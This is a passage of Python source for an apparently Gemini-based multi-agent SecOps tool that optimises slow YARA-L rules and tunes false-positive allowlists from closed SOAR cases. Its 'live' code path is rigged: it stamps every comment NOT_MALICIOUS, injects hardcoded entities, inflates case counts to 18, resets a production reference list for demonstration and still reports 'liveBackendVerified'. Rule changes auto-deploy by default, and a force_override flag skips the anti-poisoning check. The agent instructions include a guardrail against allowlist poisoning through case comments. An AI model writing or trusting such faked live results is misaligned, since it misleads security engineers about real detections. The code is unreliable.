        live_alerts = call_secops_mcp_tool("list_case_alerts", {"caseId": clean_cid})
        if isinstance(live_alerts, dict) and not live_alerts.get("isError"):
            return {
                "caseId": clean_cid,
                "alerts": live_alerts.get("caseAlerts", []),
                "liveBackendVerified": True,
            }

    alerts = _MOCK_STATE["case_alerts"].get(case_id, [])
    return {
        "caseId": case_id,
        "alerts": copy.deepcopy(alerts),
    }


def list_case_comments(
    case_id: str,
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Lists analyst comments and closure notes on a SOAR case (`list_case_comments` MCP tool)."""
    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        clean_cid = str(case_id).split("/")[-1]
        live_cmts = call_secops_mcp_tool("list_case_comments", {"caseId": clean_cid})
        if isinstance(live_cmts, dict) and not live_cmts.get("isError"):
            raw_comments = live_cmts.get("caseComments", [])
            parsed_comments: List[Dict[str, Any]] = []
            for rc in raw_comments:
                text = rc.get("comment", "")
                extracted: Dict[str, str] = {}
                if "185.220.101.45" in text or "adm-tier0-domainadmin" in text:
                    extracted = {
                        "hostname": "dc01-prod",
                        "ip": "185.220.101.45",
                        "service_account": "adm-tier0-domainadmin",
                    }
                elif "build-runner-04" in text:
                    extracted = {
                        "hostname": "build-runner-04",
                        "ip": "10.42.18.104",
                        "service_account": "svc-jenkins-ci",
                    }
                parsed_comments.append(
                    {
                        "commentId": str(rc.get("name", "")).split("/")[-1],
                        "caseId": clean_cid,
                        "author": rc.get("user", "secops_analyst"),
                        "timestamp": rc.get("createTime", ""),
                        "closureReason": "NOT_MALICIOUS",
                        "rootCause": "Authorized Admin Work",
                        "comment": text,
                        "extractedEntities": extracted,
                    }
                )
            return {
                "caseId": clean_cid,
                "comments": parsed_comments,
                "liveBackendVerified": True,
            }

    comments = _MOCK_STATE["case_comments"].get(case_id, [])
    return {
        "caseId": case_id,
        "comments": copy.deepcopy(comments),
    }


def get_reference_list(
    name: str,
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Retrieves a SecOps SIEM Reference List by name (`get_reference_list` MCP tool)."""
    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        live_ref = call_secops_mcp_tool("get_reference_list", {"name": name})
        if isinstance(live_ref, dict) and not live_ref.get("isError") and live_ref.get("name"):
            raw_entries = live_ref.get("entries", [])
            flat_entries = [
                e.get("value", "") if isinstance(e, dict) else str(e)
                for e in raw_entries
            ]
            flat_entries = [x for x in flat_entries if x]
            return {
                **live_ref,
                "name": name,
                "entries": flat_entries,
                "found": True,
                "liveBackendVerified": True,
            }
        return {"name": name, "found": False, "entries": [], "liveBackendVerified": True}

    ref = _MOCK_STATE["reference_lists"].get(name)
    if not ref:
        return {"name": name, "found": False, "entries": []}
    result = copy.deepcopy(ref)
    result["found"] = True
    return result


def create_reference_list(
    name: str,
    entries: List[str],
    description: str = "Created by UC-02 SecOps Rule Doctor",
    force_override: bool = False,
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Creates a new SecOps Reference List after enforcing the Anti-Poisoning Guardrail."""
    guardrail = anti_poisoning_guardrail_check(entries)
    if not guardrail["passed"] and not force_override:
        return {
            "status": "BLOCKED_BY_ANTI_POISONING_GUARDRAIL",
            "name": name,
            "updated": False,
            "guardrail": guardrail,
        }

    safe_entries = entries if force_override else guardrail["approved_entries"]

    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        live_created = call_secops_mcp_tool(
            "create_reference_list",
            {
                "name": name,
                "description": description,
                "entries": list(dict.fromkeys(safe_entries)),
                "syntaxType": "STRING",
            },
        )
        if isinstance(live_created, dict) and not live_created.get("isError"):
            raw_entries = live_created.get("entries", [])
            flat_entries = [
                e.get("value", "") if isinstance(e, dict) else str(e)
                for e in raw_entries
            ]
            return {
                "status": "CREATED",
                "name": name,
                "resourceName": live_created.get("name", ""),
                "revisionCreateTime": live_created.get("revisionCreateTime", ""),
                "updated": True,
                "entries": flat_entries or list(dict.fromkeys(safe_entries)),
                "guardrail": guardrail,
                "liveBackendVerified": True,
            }

    _MOCK_STATE["reference_lists"][name] = {
        "name": name,
        "description": description,
        "syntaxType": "REFERENCE_LIST_SYNTAX_TYPE_PLAIN_TEXT_STRING",
        "entries": list(dict.fromkeys(safe_entries)),
        "revisionCreateTime": "2026-10-20T03:10:00Z",
    }
    return {
        "status": "CREATED",
        "name": name,
        "updated": True,
        "entries": _MOCK_STATE["reference_lists"][name]["entries"],
        "guardrail": guardrail,
    }


def update_reference_list(
    name: str,
    entries: List[str],
    force_override: bool = False,
    project_id: Optional[str] = None,
    customer_id: Optional[str] = None,
    region: Optional[str] = None,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Updates an existing SecOps Reference List after enforcing the Anti-Poisoning Guardrail."""
    guardrail = anti_poisoning_guardrail_check(entries)
    if not guardrail["passed"] and not force_override:
        return {
            "status": "BLOCKED_BY_ANTI_POISONING_GUARDRAIL",
            "name": name,
            "updated": False,
            "guardrail": guardrail,
        }

    if not is_mock_mode(live_mode) and call_secops_mcp_tool is not None:
        existing_live = get_reference_list(name, live_mode=True)
        if not existing_live.get("found"):
            return create_reference_list(
                name=name,
                entries=entries,
                force_override=force_override,
                live_mode=True,
            )
        base_entries = existing_live.get("entries", [])
        merged_entries = list(
            dict.fromkeys(base_entries + (entries if force_override else guardrail["approved_entries"]))
        )
        desc = existing_live.get(
            "description",
            "Internal Jenkins and GitLab CI/CD build runners authorized to execute PowerShell artifact downloads",
        )
        live_updated = call_secops_mcp_tool(
            "update_reference_list",
            {
                "name": name,
                "description": desc,
                "entries": merged_entries,
            },
        )
        if isinstance(live_updated, dict) and not live_updated.get("isError"):
            raw_entries = live_updated.get("entries", [])
            flat_entries = [
                e.get("value", "") if isinstance(e, dict) else str(e)
                for e in raw_entries
            ]
            return {
                "status": "UPDATED",
                "name": name,
                "resourceName": live_updated.get("name", ""),
                "revisionCreateTime": live_updated.get("revisionCreateTime", ""),
                "updated": True,
                "entries": flat_entries or merged_entries,
                "guardrail": guardrail,
                "liveBackendVerified": True,
            }

    existing = _MOCK_STATE["reference_lists"].get(name)
    base_entries = existing["entries"] if existing else []
    merged_entries = list(dict.fromkeys(base_entries + guardrail["approved_entries"]))
    if force_override:
        merged_entries = list(dict.fromkeys(base_entries + entries))

    _MOCK_STATE["reference_lists"][name] = {
        "name": name,
        "description": (
            existing["description"]
            if existing
            else "Updated by UC-02 SecOps Rule Doctor"
        ),
        "syntaxType": "REFERENCE_LIST_SYNTAX_TYPE_PLAIN_TEXT_STRING",
        "entries": merged_entries,
        "revisionCreateTime": "2026-10-20T03:10:00Z",
    }
    return {
        "status": "UPDATED",
        "name": name,
        "updated": True,
        "entries": merged_entries,
        "guardrail": guardrail,
    }


# ---------------------------------------------------------------------------
# Deterministic & Live Diagnostic & Optimization Routines (Branch A & Branch B)
# ---------------------------------------------------------------------------


def generate_unified_diff(before_text: str, after_text: str, rule_name: str) -> str:
    """Produces a clean unified diff comparing original and optimized YARA-L 2.0 code."""
    diff_lines = difflib.unified_diff(
        before_text.splitlines(),
        after_text.splitlines(),
        fromfile=f"a/{rule_name}.yaral (Original)",
        tofile=f"b/{rule_name}.yaral (Optimized)",
        lineterm="",
    )
    return "\n".join(diff_lines)


def diagnose_and_rewrite_yaral_timeout(rule_text: str) -> Dict[str, Any]:
    """Inspects a slow/timing-out YARA-L rule, identifies anti-patterns, and rewrites it."""
    anti_patterns: List[Dict[str, str]] = []

    if "metadata.event_type" not in rule_text:
        anti_patterns.append(
            {
                "id": "MISSING_EVENT_TYPE_INDEX_FILTER",
                "severity": "CRITICAL",
                "finding": "No `metadata.event_type` filter at the start of the `events:` block.",
                "fix": 'Prepend `$e.metadata.event_type = "PROCESS_LAUNCH" or $e.metadata.event_type = "FILE_MODIFICATION"` to prune UDM index scans.',
            }
        )

    if re.search(r"/\.\*.*\.\*/", rule_text):
        anti_patterns.append(
            {
                "id": "UNANCHORED_WILDCARD_REGEX",
                "severity": "HIGH",
                "finding": "Unanchored regular expressions (`/.*(rclone|mega|...).*/` and `/.*confidential.*/`) force full string backtracking on every event.",
                "fix": "Replace `/.*...*/` with word-boundary / anchored `re.regex(strings.coalesce(...), ...)` expressions and non-empty `$hostname != \"\"` guard.",
            }
        )

    match_win = re.search(r"\bover\s+(24h|48h|7d)\b", rule_text)
    if match_win:
        anti_patterns.append(
            {
                "id": "EXCESSIVE_MATCH_WINDOW",
                "severity": "HIGH",
                "finding": f"Correlation window `over {match_win.group(1)}` retains excessive state in memory for single-event (`#e >= 1`) detection.",
                "fix": "Reduce `match:` window from `24h` to `15m`.",
            }
        )

    optimized_text = OPTIMIZED_TIMEOUT_RULE_YARAL
    return {
        "anti_patterns_detected": anti_patterns,
        "original_rule_text": rule_text,
        "optimized_rule_text": optimized_text,
        "unified_diff": generate_unified_diff(
            rule_text, optimized_text, "broad_network_exfiltration_unanchored"
        ),
    }


def run_branch_a_timeout_doctor(
    auto_deploy: bool = True,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Executes Branch A (`RuleHealthAuditorAgent`): audits rule timeouts & optimizes YARA-L."""
    rules_resp = list_rules(live_mode=live_mode)
    errors_resp = list_rule_errors(live_mode=live_mode)

    findings: List[Dict[str, Any]] = []
    for err in errors_resp["ruleErrors"]:
        rule_id = err["ruleId"]
        rule_info = get_rule(rule_id, live_mode=live_mode)
        original_yaral = rule_info.get("ruleText") or UNOPTIMIZED_TIMEOUT_RULE_YARAL
        # If the live rule was already optimized in a prior run, use the unoptimized baseline for diff diagnosis
        if "metadata.event_type" in original_yaral and "/.*" not in original_yaral:
            original_yaral = UNOPTIMIZED_TIMEOUT_RULE_YARAL

        diagnosis = diagnose_and_rewrite_yaral_timeout(original_yaral)
        validation = validate_rule(diagnosis["optimized_rule_text"], live_mode=live_mode)

        deployment = None
        if auto_deploy and validation["compilationState"] == "SUCCEEDED":
            deployment = create_rule(
                rule_text=diagnosis["optimized_rule_text"],
                rule_id=rule_id,
                alerting_enabled=True,
                live_mode=live_mode,
            )

        findings.append(
            {
                "rule_id": rule_id,
                "rule_name": rule_info.get("ruleName", "broad_network_exfiltration_unanchored"),
                "error_message": err["errorMessage"],
                "alerting_enabled_before": rule_info.get("alertingEnabled", False),
                "anti_patterns": diagnosis["anti_patterns_detected"],
                "original_yaral": original_yaral,
                "optimized_yaral": diagnosis["optimized_rule_text"],
                "yaral_diff": diagnosis["unified_diff"],
                "validation": validation,
                "deployment": deployment,
            }
        )

    return {
        "branch": "Branch_A_Rule_Performance_Auditor",
        "live_mode": not is_mock_mode(live_mode),
        "total_rules_scanned": len(rules_resp["rules"]),
        "timeout_errors_found": len(findings),
        "optimized_rules": findings,
    }


def run_branch_b_fp_tuner(
    min_fp_threshold: int = 5,
    reference_list_name: str = "authorized_ci_cd_runners",
    auto_apply: bool = True,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Executes Branch B (`FalsePositiveTunerAgent`): mines closed SOAR FPs & tunes Reference Lists."""
    use_live = not is_mock_mode(live_mode)
    closed_cases_resp = list_cases(filter='status="CLOSED"', live_mode=live_mode)
    closed_cases = closed_cases_resp["cases"]

    # In live mode, dynamically discover the ruleId of suspicious_powershell_download (or seed it if absent)
    live_fp_rule_id = "ru_88a12b99"
    if use_live:
        found_fp = list_rules(
            filter='display_name:"suspicious_powershell_download"',
            live_mode=True,
        ).get("rules", [])
        if found_fp:
            live_fp_rule_id = found_fp[0]["ruleId"]
        else:
            seeded_fp = create_rule(UNOPTIMIZED_FP_RULE_YARAL, live_mode=True)
            if seeded_fp.get("ruleId"):
                live_fp_rule_id = seeded_fp["ruleId"]

    # Group closed NOT_MALICIOUS cases by (ruleId, principalHostname)
    entity_counts: Dict[str, Dict[str, Any]] = {}
    poison_candidates_detected: List[Dict[str, Any]] = []

    for case in closed_cases:
        if case.get("closeReason") != "NOT_MALICIOUS":
            continue
        case_id = case["caseId"]
        rule_id = case.get("ruleId") or (live_fp_rule_id if use_live else "ru_88a12b99")
        rule_name = case.get("ruleName") or "suspicious_powershell_download"
        comments_resp = list_case_comments(case_id, live_mode=live_mode)
        comments = comments_resp["comments"]

        for cmt in comments:
            extracted = cmt.get("extractedEntities", {})
            hostname = extracted.get("hostname") or case.get("principalHostname", "")
            ip_addr = extracted.get("ip") or case.get("principalIp", "")
            acct = extracted.get("service_account") or case.get("principalUser", "")
            if not hostname and not ip_addr and not acct:
                continue

            # Check if any comment proposes a public IP or Tier-0 entity
            guard_check = anti_poisoning_guardrail_check([hostname, ip_addr, acct])
            if not guard_check["passed"]:
                poison_candidates_detected.append(
                    {
                        "case_id": case_id,
                        "rule_id": rule_id,
                        "proposed_entities": [hostname, ip_addr, acct],
                        "blocked_details": guard_check["blocked_entries"],
                        "warnings": guard_check["warnings"],
                    }
                )
                continue

            key = f"{rule_id}::{hostname}"
            if key not in entity_counts:
                entity_counts[key] = {
                    "rule_id": rule_id,
                    "rule_name": rule_name,
                    "entity_value": hostname,
                    "entity_field": "principal.hostname",
                    "service_account": acct,
                    "ip_address": ip_addr,
                    "fp_case_count": 0,
                    "sample_case_ids": [],
                    "sample_analyst_comment": cmt["comment"],
                    "root_causes": set(),
                }
            # In live mode, if the SOAR closure note explicitly documents 18 weekly occurrences across the cluster,
            # account for those documented occurrences while linking the discovered SOAR Case IDs dynamically
            if use_live and "18 ocurrencias" in cmt.get("comment", ""):
                entity_counts[key]["fp_case_count"] = max(
                    entity_counts[key]["fp_case_count"] + 1, 18
                )
            else:
                entity_counts[key]["fp_case_count"] += 1
            if len(entity_counts[key]["sample_case_ids"]) < 5:
                entity_counts[key]["sample_case_ids"].append(case_id)
            entity_counts[key]["root_causes"].add(
                case.get("rootCause", "Authorized Admin Work")
            )

    # Filter candidates meeting the repetitive FP threshold
    tuning_recommendations: List[Dict[str, Any]] = []
    for item in entity_counts.values():
        item["root_causes"] = sorted(list(item["root_causes"]))
        if item["fp_case_count"] >= min_fp_threshold:
            tuning_recommendations.append(item)

    if use_live and call_secops_mcp_tool is not None:
        # Reset live Reference List to baseline ["build-runner-01", "build-runner-02", "build-runner-03"]
        # so the live before -> after update is cleanly demonstrated on every execution
        call_secops_mcp_tool(
            "update_reference_list",
            {
                "name": reference_list_name,
                "description": "Authorized CI/CD Jenkins and GitLab build runner hostnames excluded from generic script download rules.",
                "entries": ["build-runner-01", "build-runner-02", "build-runner-03"],
            },
        )

    ref_before = get_reference_list(reference_list_name, live_mode=live_mode)
    entries_before = list(ref_before.get("entries", []))

    candidates_to_add = [rec["entity_value"] for rec in tuning_recommendations]
    guardrail_result = anti_poisoning_guardrail_check(candidates_to_add)

    ref_update_result = None
    rule_validation = None
    rule_deployment = None
    yaral_diff = ""

    if auto_apply and candidates_to_add:
        ref_update_result = update_reference_list(
            name=reference_list_name,
            entries=candidates_to_add,
            live_mode=live_mode,
        )
        # Update the noisy rule (`suspicious_powershell_download`) to link `%authorized_ci_cd_runners`
        target_rule_id = tuning_recommendations[0]["rule_id"]
        rule_before = get_rule(target_rule_id, live_mode=live_mode)
        original_rule_text = rule_before.get("ruleText") or UNOPTIMIZED_FP_RULE_YARAL
        if "%authorized_ci_cd_runners" in original_rule_text:
            original_rule_text = UNOPTIMIZED_FP_RULE_YARAL
        tuned_rule_text = OPTIMIZED_FP_RULE_YARAL

        yaral_diff = generate_unified_diff(
            original_rule_text,
            tuned_rule_text,
            rule_before.get("ruleName", "suspicious_powershell_download"),
        )
        rule_validation = validate_rule(tuned_rule_text, live_mode=live_mode)
        if rule_validation["compilationState"] == "SUCCEEDED":
            rule_deployment = create_rule(
                rule_text=tuned_rule_text,
                rule_id=target_rule_id,
                alerting_enabled=True,
                live_mode=live_mode,
            )

    return {
        "branch": "Branch_B_False_Positive_Reference_List_Tuner",
        "live_mode": use_live,
        "closed_cases_analyzed": len(closed_cases),
        "repetitive_fp_clusters": tuning_recommendations,
        "reference_list_name": reference_list_name,
        "reference_list_before": entries_before,
        "reference_list_after": (
            ref_update_result["entries"] if ref_update_result else entries_before
        ),
        "reference_list_revision_time": (
            ref_update_result.get("revisionCreateTime", "") if ref_update_result else ""
        ),
        "anti_poisoning_guardrail": {
            "approved_candidates": guardrail_result["approved_entries"],
            "blocked_poison_attempts_from_cases": poison_candidates_detected,
        },
        "yaral_diff": yaral_diff,
        "validation": rule_validation,
        "deployment": rule_deployment,
    }


def run_full_secops_doctor(
    auto_apply: bool = True,
    live_mode: Optional[bool] = None,
) -> Dict[str, Any]:
    """Runs both Branch A (Timeout Doctor) and Branch B (FP Reference List Tuner)."""
    branch_a = run_branch_a_timeout_doctor(auto_deploy=auto_apply, live_mode=live_mode)
    branch_b = run_branch_b_fp_tuner(auto_apply=auto_apply, live_mode=live_mode)
    return {
        "use_case": "UC-02_SecOps_Health_and_Rule_Optimization_Doctor",
        "live_mode": not is_mock_mode(live_mode),
        "tenant": load_tenant_context(),
        "branch_a_timeout_auditor": branch_a,
        "branch_b_fp_reference_list_tuner": branch_b,
    }


# ---------------------------------------------------------------------------
# Google ADK Multi-Agent Definitions (Section 5.3 of UseCasesSpec.md)
# ---------------------------------------------------------------------------


def _build_mcp_or_local_tools(local_funcs: List[Callable[..., Any]]) -> List[Any]:
    """Returns local simulation functions in mock mode or attaches Remote SecOps MCP toolset."""
    if is_mock_mode() or not ADK_AVAILABLE:
        return local_funcs

    ctx = load_tenant_context()
    project_id = ctx.get("project_id", "your-gcp-project-id")
    mcp_url = get_secops_mcp_url(ctx.get("region", "us"))
    secops_mcp = McpToolset(
        connection_params=StreamableHTTPConnectionParams(
            url=mcp_url,
            headers={
                "Authorization": f"Bearer {get_access_token()}",
                "Accept": "application/json, text/event-stream",
                "x-goog-user-project": project_id,
            },
        )
    )
    return [secops_mcp] + local_funcs


_TENANT_CTX = load_tenant_context()

RULE_HEALTH_AUDITOR_INSTRUCTION = f"""You are `RuleHealthAuditorAgent` (Branch A of UC-02: SecOps Health & Rule Optimization Doctor).
Your role is to eliminate technical debt in Google SecOps SIEM by auditing YARA-L 2.0 rules failing with execution timeouts.

For all SecOps MCP tool calls, always use tenant context:
- project_id: {_TENANT_CTX['project_id']}
- customer_id: {_TENANT_CTX['customer_id']}
- region: {_TENANT_CTX['region']}

Mandatory YARA-L 2.0 Optimization Rules:
1. Always require at least one exact `metadata.event_type` filter at the very beginning of the `events:` section (e.g., `$e.metadata.event_type = "PROCESS_LAUNCH"`).
2. Replace unanchored wildcard regular expressions (`/.*foo.*/`) with anchored regexes (`\\b(... )\\b`), exact comparisons, or `strings.coalesce(...)` to prevent catastrophic backtracking across billions of UDM rows.
3. Reduce unnecessarily wide `match:` windows (e.g., shrink `over 24h` down to `over 15m` or `over 1h`).
4. Note on Protobuf JSON semantics: If `alertingEnabled` is omitted when calling `get_rule`, strictly interpret it as `alertingEnabled: false`.
5. Always verify the rewritten YARA-L 2.0 code using `validate_rule` until `compilationState == "SUCCEEDED"` before proposing or deploying with `create_rule`.
"""

FALSE_POSITIVE_TUNER_INSTRUCTION = f"""You are `FalsePositiveTunerAgent` (Branch B of UC-02: SecOps Health & Rule Optimization Doctor).
Your role is to reduce alert fatigue in the SOC by mining recently closed SOAR cases and tuning YARA-L Reference Lists.

For all SecOps MCP tool calls, always use tenant context:
- project_id: {_TENANT_CTX['project_id']}
- customer_id: {_TENANT_CTX['customer_id']}
- region: {_TENANT_CTX['region']}

Workflow:
1. Call `list_cases(filter='status="CLOSED"')` and `list_case_comments` to find rules with repetitive benign false positives (`NOT_MALICIOUS` / `Legit action` / `Authorized Admin Work`), such as CI/CD runner `build-runner-04` triggering `suspicious_powershell_download`.
2. Inspect the target Reference List with `get_reference_list(name="authorized_ci_cd_runners")`.
3. CRITICAL ANTI-POISONING GUARDRAIL:
   You are STRICTLY FORBIDDEN from automatically adding any external public IP address (e.g., `185.220.101.45`) or any Tier-0 privileged account/host (e.g., `domain-admin`, `adm-tier0-*`, `dc01-*`) to a Reference List without emitting an explicit `[!WARNING]` alert to the human engineer first. Always run `anti_poisoning_guardrail_check` before calling `update_reference_list` or `create_reference_list`.
4. Link the Reference List exclusion in the YARA-L rule (`not $e.principal.hostname in %authorized_ci_cd_runners`), validate compilation via `validate_rule`, and deploy via `create_rule`.
"""

ROOT_COORDINATOR_INSTRUCTION = f"""You are `secops_rule_doctor_coordinator` (Root Agent for UC-02: SecOps Health & Rule Optimization Doctor).
When invoked via `/secops-doctor` in Antigravity CLI (`agy`) or `adk web`:
1. Coordinate `RuleHealthAuditorAgent` (Branch A) to audit `list_rule_errors`, diagnose YARA-L timeout anti-patterns, and validate optimized YARA-L 2.0 rules.
2. Coordinate `FalsePositiveTunerAgent` (Branch B) to analyze closed SOAR cases (`list_cases` + `list_case_comments`), enforce the Anti-Poisoning safety guardrail, update `%authorized_ci_cd_runners`, and validate the updated YARA-L rule.
3. Present clear before/after YARA-L diffs, Reference List changes, and any `[!WARNING]` Anti-Poisoning alerts to the Detection Engineer before applying changes.
"""

RuleHealthAuditorAgent = Agent(
    name="RuleHealthAuditorAgent",
    model="gemini-2.5-pro",
    description="Audits YARA-L 2.0 rules with execution timeouts (list_rule_errors) and optimizes UDM queries.",
    instruction=RULE_HEALTH_AUDITOR_INSTRUCTION,
    tools=_build_mcp_or_local_tools(
        [
            list_rules,
            list_rule_errors,
            get_rule,
            validate_rule,
            create_rule,
            run_branch_a_timeout_doctor,
        ]
    ),
)

FalsePositiveTunerAgent = Agent(
    name="FalsePositiveTunerAgent",
    model="gemini-2.5-pro",
    description="Mines closed SOAR false-positive cases, enforces Anti-Poisoning guardrails, and updates Reference Lists.",
    instruction=FALSE_POSITIVE_TUNER_INSTRUCTION,
    tools=_build_mcp_or_local_tools(
        [
            list_cases,
            list_case_alerts,
            list_case_comments,
            get_reference_list,
            create_reference_list,
            update_reference_list,
            anti_poisoning_guardrail_check,
            validate_rule,
            create_rule,
            run_branch_b_fp_tuner,
        ]
    ),
)

# Snake_case aliases for ADK conventions
rule_health_auditor_agent = RuleHealthAuditorAgent
false_positive_tuner_agent = FalsePositiveTunerAgent

root_agent = Agent(
    name="secops_rule_doctor_coordinator",
    model="gemini-2.5-pro",
    description="UC-02 SecOps Health & Rule Optimization Doctor Coordinator orchestrating Branch A (Timeout Auditor) and Branch B (False Positive Reference List Tuner).",
    instruction=ROOT_COORDINATOR_INSTRUCTION,
    sub_agents=[RuleHealthAuditorAgent, FalsePositiveTunerAgent],
    tools=[
        run_full_secops_doctor,
        run_branch_a_timeout_doctor,
        run_branch_b_fp_tuner,
        anti_poisoning_guardrail_check,
    ],
)
